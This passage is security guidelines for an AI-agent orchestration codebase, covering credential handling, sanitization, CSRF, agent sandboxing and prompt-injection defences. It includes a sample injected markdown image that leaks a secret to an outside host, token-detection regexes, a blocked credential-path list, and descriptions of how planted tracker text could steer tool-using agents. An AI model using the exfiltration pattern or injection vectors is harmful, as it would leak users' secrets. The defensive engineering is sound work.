# Security Guidelines

Security conventions and guardrails specific to the SOVA codebase: credential handling, input sanitization, subprocess safety, and prompt injection mitigation.

For vulnerability reporting, see [SECURITY.md](/SECURITY.md).

## Credential Management

### GitHub Authentication

Per-project auth via `sova/utils/gh.py:resolve_gh_env()`:

- Tokens fetched fresh from `gh auth token --user` on each call, never cached
- `GH_TOKEN` injected via subprocess `env` parameter, not globally
- Returns `None` if no user configured (inherits parent environment)

Every `gh` CLI call in `sova/adapters/github.py` and `sova/git/pr.py` passes `env=await resolve_gh_env(github_user)`.

### Jira API Token

`jira_api_token` in `sova/config/models.py` uses `Field("", repr=False)` to suppress from Pydantic repr, preventing accidental logging. Store as `SOVA_TASK_JIRA_API_TOKEN` env var. See [JIRA Configuration Guide](jira-configuration-guide.md) for full setup.

### MCP Token Secret

`mcp.token_secret` signs the run-scoped MCP and A2A bearer tokens (`sova/dashboard/services/mcp_service.py`), so it is declared `Field("", repr=False)` like the other credential fields.

### LLM API Key (Anthropic provider)

`llm.api_key` is resolved through the optional OS keyring (`sova/llm/keyring_store.py`, wraps the `keyring` package behind an import guard) before falling back to the plaintext `project_settings` database row, then `ANTHROPIC_API_KEY`. When a keyring backend is available, the settings layer (`sova/dashboard/services/settings_service.py`) moves a newly-saved key into the keyring and replaces the database row with a non-secret sentinel (`keyring_store.SENTINEL`); resolution happens once, at `create_provider()`'s anthropic branch (`sova/llm/provider.py`), not in `load_config()`, so the key never re-enters `cfg.model_dump()`. The ntfy token (`notification.ntfy_token`) is resolved at send time, with the `SOVA_NOTIFICATION_NTFY_TOKEN` environment variable first (an explicit operator override, so a token rotated after a 401 is not shadowed by a stale keyring entry) and then the same keyring-then-database order, in `send_ntfy_notification()` (`sova/ipc/notifications.py`), under a fixed `ntfy` keyring scope rather than the LLM provider's (`keyring_store.fixed_scope()`), so switching `llm.provider` does not orphan it. `get_config()` masks every `value_type="secret"` setting with a fixed placeholder before it can reach the settings API response. Only `key in keyring_store.RESOLVED_SECRET_KEYS` (today: `llm.api_key` and `notification.ntfy_token`) is actually routed through the keyring: every other `value_type="secret"` setting (Jira token, SMTP credentials, webhook secrets, MCP token secret, telemetry hub token) still reads its plaintext database value directly at its one consumption site, and moving its storage without updating that site would silently replace a working credential with the sentinel string. An existing plaintext key is never migrated automatically; the dashboard's "Move to keychain" action (`POST /settings/config/migrate-secret`) is the only way to relocate one, and it verifies the keyring write by reading it back before clearing the database row.

### Codex/OpenAI Authentication

For end-to-end setup instructions (browser login with keyring storage, the device-auth and stdin API-key fallbacks for browser-less environments, rollback to Claude Code, and remediation for a stray global `CODEX_API_KEY`/`OPENAI_API_KEY`), see [Codex Runtime Setup Guide](codex-runtime-setup.md). The rest of this section covers the credential-handling mechanics inside SOVA's own code.

Codex CLI owns its own credential storage; SOVA never reads, copies, masks, or persists it. Two distinct auth paths:

- **Saved keyring auth** (preferred for a local, long-running server): one-time `codex login`, or `cli_auth_credentials_store = "keyring"` in Codex's own config. The credential lives entirely inside Codex's credential store; SOVA's only interaction is a read-only readiness probe (`codex login status`, never a model request).
- **Per-process automation auth** (`CODEX_API_KEY`): an opt-in escape hatch for trusted automation that explicitly wants environment-based auth instead of keyring. Never written to argv, config, the database, shell profiles, or file-backed output. `CODEX_API_KEY` is in `sova/utils/env.py`'s `SCRUBBED_VARS`, so it is stripped from every spawned agent by default; only `CodexRuntime.spawn()` re-injects it scoped to the immediate `codex exec` child (via `extra_env`, applied after scrubbing). The reviewer role's `spawn_direct()` call (`agent_lifecycle.py`, via the shared `_codex_extra_env()` helper) is a wider exception: it re-injects the key into the reviewer's whole `sova run` process (and everything that process spawns), not just one child, because its optional read-only Codex repo-context sub-call (`ReviewerRole._gather_repo_context()`) runs as a plain subprocess from inside that already-scrubbed reviewer process rather than through `CodexRuntime`. To keep that wider exposure opt-in rather than ambient, `agent_lifecycle.py` only computes `_codex_extra_env()` for the reviewer when `review.repo_context_agent` (default off) is enabled for the project; with the feature off, the key is never re-admitted into the reviewer's environment at all, even if set in the server's own process environment. It still never reaches a `ClaudeCodeRuntime` or `AiderRuntime` child, or any other direct-spawn role.

Codex spawns also scrub `ANTHROPIC_API_KEY`/`ANTHROPIC_AUTH_TOKEN` (via `extra_scrub`, which wins over `agent.env_passthrough`) so a credential meant for Claude Code cannot leak into an unrelated Codex child. `check_available()` reports credential presence as a boolean only (`", CODEX_API_KEY set"`), never the value.

`OPENAI_API_KEY` is also in `SCRUBBED_VARS`, so it is stripped from every spawned child by default, same as `CODEX_API_KEY`. Its one re-injection path is narrower than `CODEX_API_KEY`'s: `spawn_direct()` (`sova/ipc/runtime.py`), the launcher for the developer/researcher/planner pipeline roles, re-admits it via `_openai_extra_env()` (applied after scrubbing, mirroring `_codex_extra_env()`), because that subprocess's own `WorkflowEngine` may need it for an in-process litellm call (`sova/llm/litellm_provider.py`) when the project configures an OpenAI-backed model. No `AgentRuntime` spawn (`ClaudeCodeRuntime`, `AiderRuntime`, `CodexRuntime`) ever receives it. The parent server's own in-process litellm/OpenAI SDK read is a separate, unaffected path: it reads `os.environ` directly, and `scrub_agent_env()` only transforms the dict handed to a *spawned* child. Neither `OPENAI_API_KEY` nor `CODEX_API_KEY` can be re-admitted by naming it in `agent.env_passthrough`: `scrub_agent_env()` strips both out of the passthrough keep-set unconditionally, since that escape hatch exists for provider-routing vars (Vertex/Bedrock), not for credentials, and is global across every runtime rather than scoped to one trusted call site.

`CodexRuntime.spawn()` delivers the workflow prompt via stdin instead of argv when `_probe_codex_stdin_prompt_support()` confirms the installed Codex CLI documents reading an omitted `PROMPT` from stdin (read via `codex exec --help`, never a model request). This closes the `ps`/`pkill -f` argv-visibility gap for a CLI that supports it; a CLI the probe cannot confirm, or one that errors/times out, falls back to the pre-existing argv delivery.

### Worktree Credential Copying

`WorktreeConfig.copy_files` defaults to `[".env", ".env.local"]`. These are copied into new worktrees so agents can authenticate. Ensure `.gitignore` covers these patterns.

### SQLite DB File Mode

`.claude/sova.db` stores `project_settings`, which is where every secret without a `RESOLVED_SECRET_KEYS` keyring entry (Jira token, SMTP credentials, webhook secrets, MCP token secret, telemetry hub token) lives in plaintext. `sova/db/session.py:_secure_db_file()` chmods the file to `0600` once per creation (`init_db()`, `init_db_for_project()`) and once per `.db.bak` backup copy (`_backup_db()`), rather than on every `get_session()` call, so group/world access is denied regardless of the process umask without adding a syscall to every DB access.

| Do | Do Not |
|----|--------|
| Use `resolve_gh_env()` for subprocess auth | Set `GH_TOKEN` globally in your shell |
| Use `repr=False` on secret Pydantic fields | Log config objects containing tokens |
| Keep secrets in `.env` (gitignored) | Add secrets to `sova.toml` or the DB |

## Subprocess Execution Safety

All subprocess calls go through `sova/utils/shell.py:run()`, which uses `asyncio.create_subprocess_exec(*args)`, no shell expansion, no `shell=True`.

- Arguments are never concatenated into a shell string
- Default timeout of 300s prevents hung processes
- `subprocess_error()` factory truncates stderr to 500 chars
- `ClaudeCodeRuntime.spawn()` in `sova/ipc/runtime.py` follows the same pattern

### shlex.quote for Dashboard Commands

Dashboard constructs CLI commands for headless agents with `shlex.quote()` (`sova/dashboard/services/agent_lifecycle.py`):

```python
cmd_parts.append(shlex.quote(issue))
cmd_parts.extend(["--role", shlex.quote(role)])
```

## Suspicious File Guard

`sova/git/safety.py` holds `SUSPICIOUS_PATHS` and `unstage_suspicious_files()`, shared by `sova/git/branch.py:commit()` (raises `RuntimeError` on a match) and `sova/git/worktree.py:preserve_partial_work()` (logs a warning and fails closed instead, since that caller must not abort entirely just because a secret was mixed in with real partial work):

```python
SUSPICIOUS_PATHS = frozenset(
    {
        ".venv",
        ".env",
        ".env.local",
        "credentials.json",
        ".secrets",
        "node_modules",
        ".DS_Store",
        "__pycache__",
        ".mcp.json",
    }
)
```

`.mcp.json` (project root, outside `.claude/`) can hold a plaintext MCP sidecar token (see `sova/cli/commands/project.py`'s Atlassian sidecar config), so it needs the same guard as `.env`. It is also gitignored in this repo's own `.gitignore` for the same reason; `sova/utils/mcp_config.py` already writes it with mode 0600.

`unstage_suspicious_files()` uses `Path(f).parts` for component matching so nested paths like `src/.env` are caught, batches the `git reset HEAD --` cleanup, and re-queries the index afterward rather than trusting the reset command's own exit code, so a path the reset silently failed to remove is reported as `still_staged` instead of assumed clean. A failed staged-file query (e.g. a concurrent `index.lock`) is reported as `checked=False`, which both callers treat as unsafe rather than "nothing suspicious found".

## Secret Redaction in Logs

`sova/core/steps/monitor_ci.py` redacts sensitive patterns from CI log output before LLM processing:

```python
_SENSITIVE_PATTERNS = re.compile(
    r"(?i)"
    r"(?:token|secret|password|api[_-]?key|authorization)[=:\s]+\S+"
    r"|ghp_[A-Za-z0-9]{36}"  # GitHub classic PAT
    r"|ghs_[A-Za-z0-9]{36}"  # GitHub OAuth token
    r"|github_pat_[A-Za-z0-9_]{82}"  # GitHub fine-grained PAT
    r"|sk-[A-Za-z0-9]{48}"  # OpenAI key
)
```

`_redact_logs()` replaces matches with `[REDACTED]`. Apply whenever passing external log output to the LLM or dashboard.

## Input Sanitization

### Branch Names

`invariants/branch-naming.sh` enforces: `^(feat|fix|refactor|docs|chore|test)/[a-z0-9][a-z0-9-]+$`

Prevents shell metacharacters, path traversal sequences, and spaces in branch names.

### JQL Values

`sova/adapters/jira.py:_sanitize_jql_value()` strips `"`, `\`, and control chars via `re.sub(r'["\\\x00-\x1f]', "", value)`. Applied to `project_key`, `component`, and `labels`. The `jql_filter` field is trusted config input, not sanitized.

### MCP Path Traversal

`sova/mcp/tools.py:_validate_project_dir()` resolves symlinks via `Path.resolve()` and validates against an allowed root when the MCP server is bound to a startup project.

### MCP JSON-RPC Argument Whitelisting

`sova/dashboard/routers/mcp.py:_filter_tool_arguments()` strips any client-supplied JSON-RPC argument the target tool function's own signature does not declare, and always strips `project_dir` even when declared: every `mcp_service` tool scopes its DB/session calls by `project_dir`, so forwarding a client-supplied value verbatim would let a token valid for one run redirect a query at an arbitrary other project. The allowlist is built per tool from `inspect.signature()` rather than one global "safe keys" list, so a tool with a legitimately different optional parameter is never broken by a list sized for another tool.

### Dashboard Command Name Validation

`POST /api/agents/command`'s `command` field names a file resolved relative to the project's own and SOVA's own `.claude/commands/`/`sova/commands/data/commands/` directories (`sova/dashboard/services/agent_context.py:_resolve_command_prompt()`); an unvalidated value is both a path-traversal vector (building a filesystem path from it) and a prompt-injection vector (its fallback sends a bare `/{command}` to the headless, tool-using agent for anything it cannot resolve to a real file). `known_command_names()` mirrors `_resolve_command_prompt()`'s own lookup order, and `start_command()` itself (`sova/dashboard/services/agent_lifecycle.py`) refuses any `command` not in that set, before any gate, lookup or spawn, so every caller is covered: the HTTP route, the handoff action route, auto-handoff, workflow (DAG) nodes and the supervisor. It also refuses an argument whose key is outside `COMMAND_ARG_KEYS` (`issue`, `pr`) or whose value is not None, empty, an integer or an issue reference without whitespace (`42`, `#42`, `PROJ-123`, `owner/repo#42`; `command_args_error()` in `agent_context.py`), since each argument is written into the agent's prompt as `key=value`. Every current producer sends only `issue` and `pr` (a `role` key appears only on `mode="agent"` actions, which go to `start_agent()`). A refusal returns `UNKNOWN_COMMAND` or `INVALID_COMMAND_ARGS` (`COMMAND_INPUT_ERRORS`) and logs `start_command.rejected`; both `POST /api/agents/command` and `POST /api/handoff/execute` answer it with `400`, the former checking it (`command_request_rejection()`) before it records an action so bad input never shows as a failed action, and auto-handoff logs the refused start as `auto_handoff.start_refused`. A handoff action stores the slash form (`/integrate-pr 42`); both handoff paths reduce it to the catalog name with `handoff_service.command_name()` first, which turns a missing command into `""` (nothing to run).

Dashboard command agents need network access for GitHub and tracker operations. The Codex runtime grants it only when `start_command()` requests it and only inside the `workspace-write` filesystem sandbox. Pipeline role agents and read-only repo-context calls remain offline; `codex.sandbox = "read-only"` rejects a networked command before spawn.

### Multi-Project Slug Validation

`sova/dashboard/middleware.py` validates project slugs against `^[a-z0-9-]+$` before path resolution, preventing directory traversal via URL segments.

### Template Variables in Inline JavaScript

Jinja2's `{{ var }}` uses HTML escaping, not JavaScript string escaping. A value containing `'` or `</script>` can break the handler or become XSS when interpolated into inline JS.

```html
<!-- Wrong -- HTML-escaped, not JS-safe -->
<button onclick="doThing('{{ slug }}')">

<!-- Correct -- pass via data attribute, read in handler -->
<button data-slug="{{ slug | e }}" onclick="doThing(this.dataset.slug)">
```

Inside a `<script>` block, write the value with `tojson`, which emits a complete, JS-safe string literal (`supervisor.html`'s `githubRepo`, `spec.html`'s `_issueNumber`). Never wrap `{{ var }}` in quotes by hand: a trailing backslash escapes the closing quote.

```html
<script>
var issueNumber = {{ issue_number | tojson }};
</script>
```

### Rendered Markdown

marked passes raw HTML in its input straight through, so its output must never reach `innerHTML` unsanitized. Render markdown only through the two helpers in `_head.html`: `renderMarkdown()` for blocks and `renderMarkdownInline()` for a single line. Both sanitize with DOMPurify and fall back to escaped text when either library failed to load. Text an LLM wrote (agent output) goes through `renderMarkdown(text, {untrusted: true})`: sanitizing stops script execution but not outbound loads, and a prompt-injected `![x](https://host/?d=<secret>)` would make every viewer's browser fetch that URL on render. The untrusted path turns an image into a link to its URL, forbids every other tag and attribute that loads on render, and opens links in a new tab with `rel="noopener noreferrer"`. `tests/test_dashboard_script_injection.py` runs both helpers under node and fails if any other template or script calls `marked.parse()` or `marked.parseInline()` itself.

### Manifest Path Traversal

`_remove_managed_commands()` in `sova/cli/commands/project.py` reads filenames from `.sova-manifest.json`. A tampered entry like `../../sova.toml` could escape the managed directory. Guard with `resolve()` + `is_relative_to()`.

## Third-Party Browser Assets

The dashboard loads a few libraries from public CDNs, including DOMPurify, which sanitizes rendered markdown. Each remote `<script>` or stylesheet must pin an exact version and carry `integrity="sha384-..."` and `crossorigin="anonymous"`, so a compromised CDN or package account cannot run code in the dashboard. The version must be exact because a range such as `@15` changes the served bytes on the next release and the hash then blocks the script. `invariants/cdn-integrity.sh` enforces all three.

## Force Push Safety

`sova/git/branch.py:push()` always uses `--force-with-lease` instead of `--force`, protecting against data loss from concurrent work.

## Budget Limits (Denial-of-Wallet)

| Limit | Default | Config Key |
|-------|---------|------------|
| Per-run budget | $10.00 | `agent.max_budget` |
| Per-issue budget | $50.00 | `agent.max_issue_budget` |
| Step timeout | 1800s | `agent.step_timeout` |
| Max run wall clock | 14400s | `runaway.max_run_wall_clock_seconds` (0=disable) |
| Max run steps | 100 | `runaway.max_run_steps` (0=disable) |
| Max LLM calls | 250 | `runaway.max_llm_calls` (0=disable) |
| Max step attempts | 80 | `runaway.max_step_attempts` (0=disable) |

Per-issue budget is checked in `start_agent()` before spawning; only an explicit
`budget_override` bypasses it (`--force` does not, so a force retry spawned for an unrelated
reason still gets the hard budget stop). Per-run budget is checked at step boundaries in
`WorkflowEngine`.

The two dollar limits go blind against a provider that reports `cost_usd=0` for every call, so
`WorkflowEngine._check_runaway_guard()` backstops them with cost-independent wall-clock,
step-count, and LLM-call-count limits (`[runaway]` config section), also enforced at step
boundaries. Wall clock is scaled by task complexity (same multiplier as `agent.step_timeout`,
via `sova.llm.complexity.complexity_multiplier`), so a legitimate EPIC-complexity run is not
paused by a limit sized for the default tier. `max_run_steps` counts completed steps within a
single run, which is bounded by the pipeline length (16 for the developer pipeline), so it is a
ceiling for future longer pipelines rather than an active guard today; `max_llm_calls` is the
limit that catches retry/fix loops (CI-fix, address-review consensus) that burn LLM calls inside
a single step without advancing the step count. `max_step_attempts` caps cumulative attempts at
a single step across model-fallback switches, tracked via `sova.llm.client`'s ContextVar-based
call counter (`start_call_counter`/`get_call_count`), incremented at the four `invoke*` entry
points so a step calling the client indirectly cannot bypass it. `ExecutionContext.resource_remaining_fraction`
composes the budget, wall-clock, and call-count signals into the single fraction that graceful
degradation call sites (skip optional steps, stop retrying, skip hooks) read.

## Headless Agent Security

`sova/ipc/runtime.py` spawns Claude CLI with `--permission-mode bypassPermissions` (`auto` only auto-approves tools already in the settings.json allowlist, which is insufficient for headless agents that must edit arbitrary project files). Mitigations:
- Per-run and per-issue budget caps
- Step timeouts (default 1800s)
- Suspicious file guard catches credential commits even from autonomous agents
- Dashboard binds to `127.0.0.1` by default; a non-loopback `--host` is supported but then relies on the CSRF guard's fail-closed behavior and `TrustedHostMiddleware` rather than being unreachable outright (see "Dashboard Security Model" below)

### Conversation Turns Are Read-Only by Runtime Enforcement

A feed-panel conversation turn (`services/conversation_service.py`) is never spawned through `AgentRuntime.spawn()` and never relies on its advisory `read_only` flag (`enforces_read_only` is False for Claude Code). It goes through `spawn_conversation_turn()`, which each runtime implements with its own enforcement, and the base class refuses, so an unsupported runtime fails the turn with a visible reason instead of falling back to one that can write:

- **Claude Code** (`build_claude_conversation_args()`): no `bypassPermissions`, and `--permission-mode default` pins the mode against a `defaultMode` in the operator's own settings, so the CLI denies any tool not pre-approved in a non-interactive call; `--settings` disables every hook; `--tools ""` removes every built-in tool (no shell, edit, write or file read); `--strict-mcp-config --mcp-config` loads only the read-only SOVA MCP server; `--allowedTools` names exactly `mcp__sova__sova_status`, `mcp__sova__sova_pending` and `mcp__sova__sova_explain_issue` (`CONVERSATION_MCP_TOOLS`). The prompt stays on stdin.
- **Codex**: `codex exec --sandbox read-only --ignore-user-config --ignore-rules`, with one `--config mcp_servers={sova = {...}}` override naming the read-only SOVA MCP server. Codex merges its config layers, so the override alone would not remove another layer's servers: `--ignore-user-config` skips the operator's `$CODEX_HOME/config.toml`, and `codex_system_mcp_files()` refuses the turn while the system layers (`/etc/codex/config.toml`, `/etc/codex/managed_config.toml`) or a project layer (`.codex/config.toml` in the checkout or a parent) define any MCP server (an MCP server runs outside the sandbox). The prompt is delivered on stdin only: a CLI whose stdin support is not confirmed fails the turn rather than putting it on argv, and the probe's verdict is not kept after a refusal, so a later turn probes again. Codex turns never resume a session, since `codex exec resume` takes no `--sandbox` flag; the transcript is replayed instead, and the stored Claude session id is cleared so a later Claude turn replays too.
- **Managed Claude Code policy**: hooks defined in managed settings run whatever a turn's own `--settings` say, so `claude_managed_hook_files()` refuses the turn while any exist in `/Library/Application Support/ClaudeCode`, `/etc/claude-code` or the macOS MDM plist `/Library/Managed Preferences/com.anthropic.claudecode.plist` (an unreadable file or an unlistable `managed-settings.d` refuses too). Windows registry policy is not read.
- **The MCP server** is `sova mcp serve --read-only` (`create_server(read_only=True)`), which registers only those three tools: no command tool and no mutating operator tool exists to be called. `sova_explain_issue` reads through the running server's `GET /issues/explain` over loopback like the other operator tools, and the MCP process never imports `control_service`.
- **Untrusted text**: the issue context and a replayed transcript enter the prompt through `quote_untrusted()`, the turn's header says tagged blocks and tool fields marked untrusted are data, and `sova_explain_issue` carries the operator tools' `_UNTRUSTED_NOTE` plus `untrusted_sections`. Every free-text field it returns (issue title, body and comments, run results, the failed step's error, output lines, the handoff summary) passes through `scan_and_redact()` first, and an issue key never starts with a hyphen (`normalize_issue_key()`), so it cannot be read as an option by a tracker CLI.

## Prompt Injection Mitigation

When adding LLM-facing code:
1. Place user content in clearly delimited data sections, separate from instructions
2. Constrain output format (JSON, not freeform)
3. Validate parsed output against known schemas or enums
4. Wrap LLM calls in try/except so injection-caused errors are non-fatal
5. Pass an embedded data block (a reviewed diff) as `invoke(..., untrusted_segments=...)` only on a tool-free call (`isolated=True`): the guard then scores it as data and logs `guard.data_segment_flagged` instead of rejecting the prompt, while every other part of the prompt stays guarded. Never use it for a prompt that reaches an agent runtime with tools.
6. Quote tracker and review text with `quote_untrusted()` (`sova/utils/prompt_quoting.py`) wherever it enters an agent prompt, and accept review text as work only from a trusted author. `AddressReviewStep` reads PR review bodies and inline comments from GitHub only when they come from the trusted reviewer (`github_user`, else the active gh account, as `parse_review_history(trusted_login=...)`'s callers resolve it) or an `OWNER`, `MEMBER` or `COLLABORATOR`, logs `address_review.untrusted_reviews_skipped` for the rest, and fetches nothing when no trusted login resolves. `MEMBER` is membership of the owning organization, not push access to the repository: it is kept so an organization's team reviewers count, and their text is still quoted as data. `/address-pr` applies the same author rule, plus two named review bots (CodeRabbit and Sourcery); any other bot is untrusted, since a bot such as `github-actions[bot]` can echo text a PR author controls. The headless preamble (`sova/ipc/runtime.py`, shared by Claude and Codex) states that quoted tracker and review text is data, and limits its literal-command rule to SOVA's own step instructions.

## Dashboard Security Model

- Single-user, loopback-only deployment model: no user accounts, sessions, or login page. Binds to `127.0.0.1:8111` by default; access to the machine implies access to the dashboard.
- No CORS middleware (not needed for localhost); instead, `sova.dashboard.security.require_same_origin_csrf` checks the request's Origin/Referer against the dashboard's own scheme+host+port and a double-submit CSRF cookie/header pair. This defends against a different threat than CORS: any web page the browser visits (not just the dashboard's own origin) can otherwise issue cross-origin `fetch()` calls at the local port, and DNS rebinding makes same-origin policy alone incomplete (a rebound page's `Origin` header still reflects where it was loaded from, which the guard checks against).
- On a loopback bind the guard is a no-op for safe methods (GET/HEAD/OPTIONS; a signed non-loopback bind checks reads too, below), and it is registered once, at router level, in `sova/dashboard/app.py:_register_api_routers()`: every router it installs gets the dependency, so a mutating route is covered by construction rather than by a per-route `Depends()` a new route can simply omit (issue #1204; the per-route pattern is exactly how most routes went unguarded before this). `mcp.router` (`/mcp`) is the sole exemption, since its own bearer-token scheme already authenticates every call; `/api/telemetry/ingest` is exempt structurally (registered by a separate call that never passes through `_register_api_routers()`). `issue_csrf_cookie()` is called from every page route, not a handful, so any page's own JS can call a guarded endpoint.
- A page opened before a dashboard restart or deploy can be stale in two ways: it has no `sova_csrf` cookie (only a page GET issues one), or it runs JS from before the `fetch()` patch that echoes the cookie. Both get `403 CSRF_REJECTED_DETAIL` on every mutating call, which reads as a server fault. Two things keep that recoverable. `/static/*` is served `Cache-Control: no-cache` (revalidated against its ETag on each use, a bodiless 304 when unchanged), never a `max-age`, so a freshly loaded page can never pair with cached pre-deploy JS. And `app.js`'s fetch wrapper rewrites that exact detail into a "reload the page" message and keeps one sticky toast with a Reload button on screen (shown again if dismissed); it never retries or reloads on its own, so an open form is not lost. `CSRF_REJECTED_DETAIL` in `sova/dashboard/security.py` is the contract between the two sides (`tests/test_csrf_stale_page.py` pins it).
- `TrustedHostMiddleware` validates the `Host` header against the same loopback-aware host set the CSRF guard derives (`sova.dashboard.security.build_allowed_hosts`). A wildcard bind (`0.0.0.0`, `::`) has no single derivable host, so it allows `"*"` there and relies on fail-closed behavior for the real protection: a wildcard bind is always fail-closed, and then `create_app()`'s `refuse_when_fail_closed` middleware answers 403 to every HTTP request, pages included, since a page renders server-side data (the hub lists every registered project path). Exempt are the status probes (`/healthz`, which reports one aggregate `db` result there and never a `db_<slug>` key per project, `/api/health`, `/api/health/connectivity`; all three are declared on the app, so the CSRF dependency of the routers never applies to them) and the machine endpoints that carry their own authentication and sit outside the CSRF guard by design (`POST /api/telemetry/ingest` with its token, `/api/mcp` and `/p/{slug}/api/mcp` with their bearer token, `POST /a2a/tasks/{id}/cancel` with its run-scoped bearer token, and the agent cards `/.well-known/agent.json` and `/a2a/{role}/agent.json`, which are static capability documents; the A2A task reads `/a2a/tasks` and `/a2a/tasks/{id}` carry no authentication and stay refused; `is_fail_closed_exempt()` in `sova/dashboard/security.py` holds the list), so a telemetry hub started with `--host 0.0.0.0` keeps accepting ingest; the scheduler's `/api/scheduler` activity routes stay refused, since they carry no authentication.
- A `Content-Security-Policy` plus `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and `Referrer-Policy: strict-origin-when-cross-origin` are set on every response (`sova/dashboard/app.py`'s `security_headers` middleware). The CSP allows `'unsafe-inline'` for scripts/styles: dashboard templates use inline `<script>` blocks and `onclick` handlers extensively, and tightening that to a nonce/hash scheme is a template-by-template rewrite, not done here. The CDN hosts allowed (`cdn.jsdelivr.net`, `cdnjs.cloudflare.com`) match `invariants/cdn-integrity.sh`'s pinned set.
- When bound to a non-loopback host (`--host <LAN IP>`), the dashboard fails closed (every HTTP request but the exempt ones listed above gets 403, pages included, and the websocket is closed) unless `dashboard.csrf_secret` holds a strong secret (with none, the server logs `dashboard.nonloopback_no_secret` at startup); a wildcard bind (`0.0.0.0`, `::`) fails closed even with a secret, and logs the same event. Strong means `is_strong_csrf_secret()`: at least 32 characters and 8 distinct ones. A weaker value also fails closed and logs only `dashboard.csrf_secret_too_weak`, with how to generate one: `python -c 'import secrets; print(secrets.token_urlsafe(32))'`. Upgrade note: before issue #1568 only the secret's presence was checked, so an install that set an opt-in value such as `1` must replace it with a generated secret (`sova config set dashboard.csrf_secret <value>`), since the secret now keys the token's HMAC and a weak key can be brute-forced offline from any token a page hands out.
- With `dashboard.csrf_secret` set on a non-loopback bind (issue #1568), the CSRF token is signed: `issue_csrf_cookie()` mints `<issued_at>.<nonce>.<HMAC-SHA256(csrf_secret, issued_at.nonce)>` (`sign_csrf_token()`), and `require_same_origin_csrf` rejects a pair whose signature does not verify or that is older than `CSRF_TOKEN_MAX_AGE_SECONDS` (24 hours; `verify_signed_csrf_token()`), so a client cannot choose its own cookie and header pair and an attacker page cannot mint one. The expiry bounds only an unused token, not a bearer-token lifetime: every page load issues a fresh token, and `CsrfCookieRefreshMiddleware` renews one past half its lifetime on any response (only a token that still verifies is renewed), so a page left open for days keeps working and a holder can keep a token alive. That middleware is pure ASGI and added before `TrustedHostMiddleware` and `ProxyIdentityMiddleware`, so it runs inside both: a request they refuse (an untrusted Host, a proxied request without an allowed login) never gets a renewed token. Reads need a validly signed cookie too, and an `X-CSRF-Token` header a read sends must match it (a browser's `EventSource` cannot set a header, so the cookie alone carries a read). The `/api/ws/agents/status` handshake follows the read rule, since a browser cannot set a header on it either. A loopback bind keeps the plain double-submit pair, which the MCP operator client sends. The signed token is a forgery and CSRF defence, not authentication: anyone who can load a page over the bound interface gets a valid cookie. The cookie is therefore issued only to a request that passed `TrustedHostMiddleware` and whose `Origin`, when it sends one, is the dashboard's own (`issue_csrf_cookie()` returns None and sets nothing otherwise). Tailscale Serve with proxy identity (below) remains the supported way to reach the dashboard from another device. A browser scopes a cookie by host, not port, so two non-loopback dashboards on one address (the hub and a per-project dashboard) must share one `dashboard.csrf_secret`, or each overwrites the other's `sova_csrf` cookie and refuses the other tab until it reloads; `static/app.js` retries a mutating call once with the renewed cookie when a concurrent response renewed it mid-flight.
- The A2A protocol's one mutating route (`POST /a2a/tasks/{task_id}/cancel`) is outside the CSRF guard (A2A is a non-browser, agent-to-agent surface) but is not unauthenticated: it reuses `mcp_service`'s run-scoped HMAC generate/validate pair, the same bearer-token shape an agent already presents to `/mcp`, scoped to the exact run_id the task ID encodes.
- The `/api/ws/agents/status` websocket sits outside the HTTP guard (a websocket route cannot take a `Request` dependency), and browsers apply no same-origin policy to websockets. `sova.dashboard.security.validate_websocket_origin` therefore checks the handshake's `Origin` against the same `app.state.allowed_origins` and refuses everything when `app.state.csrf_fail_closed` is set. On a non-loopback bind with a strong secret the handshake also needs a validly signed `sova_csrf` cookie (the read rule above, since a browser cannot set a header on a handshake). A missing, `null` or foreign `Origin`, or a missing or invalid signed cookie where one is required, is closed with code 1008 before `accept()`; there is no `Referer` fallback. A fail-closed refusal is logged at debug (startup already warns, and open tabs retry forever); an Origin mismatch is also logged at debug only (any page a user visits can open sockets in a loop), with the attacker-supplied Origin truncated to 100 characters. A non-browser client must send an `Origin` from the allowlist explicitly.
- `POST /api/mcp` parses its body through the `JsonRpcRequest` envelope model (`sova/dashboard/routers/mcp.py`); a body that is not an object with `jsonrpc` of `"2.0"` (when present), a string `method`, and a string/integer/null `id` gets a JSON-RPC `-32600` error with HTTP 200, after the bearer-token dependency has run. The envelope accepts any object, array or null `params`, so an unknown method keeps `-32601`; only the `tools/call` branch validates the object form (`name` a string, `arguments` an object) and answers `-32602` otherwise. The error echoes the request `id` when it is a string or integer, and uses null otherwise. A client-supplied `token_run_id` argument is dropped; only the authenticated run id is ever used.
- The MCP operator tools (`sova/mcp/operator.py`, served by `sova mcp serve`) are a direct loopback client of these routes, not a second way to start agents: each tool calls the running server's own route, so the CSRF guard, the duplicate check, the budget guard and the suitability check all apply, and the module never imports `control_service` or `invoke_command()` (an in-process call would spawn outside the server's agent pool, which is why the six blocking MCP tools bypass those checks). The client refuses a `server.host` that `is_loopback_host()` rejects before sending anything, whatever `dashboard.csrf_secret` says, and satisfies the guard the way this section documents for a non-browser client: the dashboard's own `Origin` plus a freshly generated `sova_csrf` cookie and matching `X-CSRF-Token` header. No new token scheme. A refusal reaches the model as the server's `detail` text only, never a raw body, header or traceback, and a mutating call is sent at most once. `sova_start_run` cannot pass `force`, `budget_override`, `override_suitability` or a model override. Only `sova_status` and `sova_pending` carry the MCP read-only annotation: every mutating tool keeps the client's permission prompt, which is the human confirmation and the guard against instructions planted in tracker text the session reads. That text is returned in JSON fields, and the read tools' descriptions name it untrusted data.
- Conversation actions (propose and confirm boundary, issue #1545): a feed conversation's agent may only propose a change, never execute one. `sova/dashboard/services/conversation_actions.py` holds the fixed registry (`KINDS`): clean up after a run, mark a failed step done and resume, reset a stuck issue, start, stop or resume one run, execute or dismiss one handoff action, and file an issue (or comment on an existing one). `propose_action()` rejects an unknown kind, an unknown or malformed parameter (including any `force`-style key) or a target that does not exist in this project with `ProposalRejected`, and executes nothing. `confirm_action()` is the only executing path, reached by a user's click: it recomputes the preview, compares its fingerprint (a SHA-256 over kind, normalized params and the facts the decision rests on: targets, dirty state, run status, guard results) with the one the card showed, and on a mismatch executes nothing and returns the new preview. A blocked preview (a dirty or active worktree, a run no longer failed, an open PR, a draft below `triage.min_quality_score`) is refused at confirm, so a crafted request cannot get past what the card would show. Every kind runs through the existing service function with its own guards (`start_agent(enforce_suitability=True)` with no `force` or budget override, the cleanup safety checks, `reset_stuck_issue()`'s fail-closed blockers), and no kind is bulk: each names its targets. No setting lets a conversation confirm on its own. The confirming user is the dashboard user who clicked when the dashboard knows one (`ActionContext.confirmed_by`), else the configured `github_user`, passed in an `ActionContext` 